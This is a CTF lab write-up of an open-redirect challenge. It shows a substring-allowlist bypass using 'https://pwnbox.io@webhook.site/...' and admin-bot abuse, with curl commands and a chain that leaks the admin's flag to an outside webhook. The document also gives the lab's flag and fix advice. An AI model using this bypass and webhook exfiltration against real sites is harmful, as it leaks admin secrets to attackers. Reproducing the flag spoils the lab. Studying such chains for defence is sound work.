# Hitchhiker Pwnbox Lab - Open Redirect Admin Flag Leak

Date: 2026-07-08
Target type: CTF/lab
Bug class: Open redirect, URL allowlist bypass, admin bot abuse, sensitive query leakage

## Observation

React redirector app at `https://af276312c24c.pwnbox-lab.com/`.

Initial page hints:

- "Type a destination, hit the road."
- "Or send the admin somewhere worth seeing."
- UI shows allowed destination: `pwnbox.io`
- Redirect endpoint: `/go?to=...`
- Admin dispatch: POST `/api/report` with `{ url }`

Relevant frontend flow:

```javascript
window.location.href = `/go?to=${encodeURIComponent(destination)}`;

fetch('/api/report', {
  method: 'POST',
  headers: { 'content-type': 'application/json' },
  body: JSON.stringify({ url }),
});
```

## Hypothesis

The redirect validator likely checks only for the substring `pwnbox.io`. If so, userinfo parser confusion such as `https://pwnbox.io@attacker.com` should pass validation while browsers navigate to the attacker host. Reporting a same-origin `/go?...` URL to the admin bot may cause privileged redirect behavior.

## Evidence

Blocked external URL:

```bash
curl -sS -G "https://af276312c24c.pwnbox-lab.com/go" --data-urlencode "to=https://example.com"
```

Result:

```text
That destination is not on the route map.
```

Allowed bypass:

```bash
curl -sS -D - -o /dev/null -G "https://af276312c24c.pwnbox-lab.com/go" \
  --data-urlencode "to=https://pwnbox.io@webhook.site/testuuid123"
```

Result:

```text
HTTP/2 302
location: https://pwnbox.io@webhook.site/testuuid123
```

Admin report policy:

```bash
curl -sS -X POST "https://af276312c24c.pwnbox-lab.com/api/report" \
  -H "Content-Type: application/json" \
  -d '{"url":"https://example.com"}'
```

Result:

```json
{"error":"The admin only visits this instance."}
```

Same-origin report works:

```json
{"ok":true}
```

Working exploit:

1. Create webhook UUID.
2. Report:
   ```text
   https://af276312c24c.pwnbox-lab.com/go?to=https://pwnbox.io@webhook.site/[uuid]
   ```
3. Admin bot request received at webhook:
   ```text
   https://webhook.site/[uuid]?flag=pwnbox{a4f2e1c8b9d6053a7f1e2b3c4d5e6f78}
   ```

## Test

1. Confirm `/go?to=` allowlist behavior.
2. Test `https://allowed-host@attacker` style bypasses.
3. Confirm `/api/report` only accepts same-origin URLs.
4. Report crafted `/go` URL and inspect outbound admin request.

## Result

Confirmed chain:

```text
Substring allowlist on redirect target
-> userinfo parser confusion bypass
-> same-origin /go URL reported to admin bot
-> admin redirect appends flag query parameter
-> flag leaks to attacker-controlled webhook
```

Flag: `pwnbox{a4f2e1c8b9d6053a7f1e2b3c4d5e6f78}`

## Root cause

Redirect validation used a substring check for `pwnbox.io` instead of parsing and comparing the real hostname. The admin redirect path also appended sensitive data into the outbound Location/query.

## Fix

- Parse URLs with a strict library and allowlist exact hostnames.
- Reject userinfo, backslashes, encoded `@`, and subdomain tricks.
- Never append secrets/tokens to redirect destinations.
- Restrict admin bot navigation and strip query parameters from outbound redirects.

## Future checklist item

When a redirector shows an allowed host like `pwnbox.io`, test `https://pwnbox.io@your-collaborator` before complex parser chains.
